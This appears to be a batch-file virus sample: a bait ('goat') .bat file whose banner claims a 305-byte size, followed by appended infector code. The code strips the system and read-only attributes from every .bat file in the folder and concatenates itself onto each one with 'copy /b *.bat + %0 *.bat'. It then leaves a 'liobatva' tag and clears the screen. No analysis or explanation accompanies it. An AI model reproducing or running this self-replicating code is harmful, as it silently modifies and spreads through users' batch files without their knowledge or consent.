@echo off
echo ***********************************
echo ***********************************
echo ***********************************
echo * Goat bat file. Size = 305 bytes *
echo ***********************************
echo ***********************************
echo ***********************************

@echo off
attrib *.bat -s -r>nul
copy /b *.bat + %0 *.bat /y>nul
rem liobatva
cls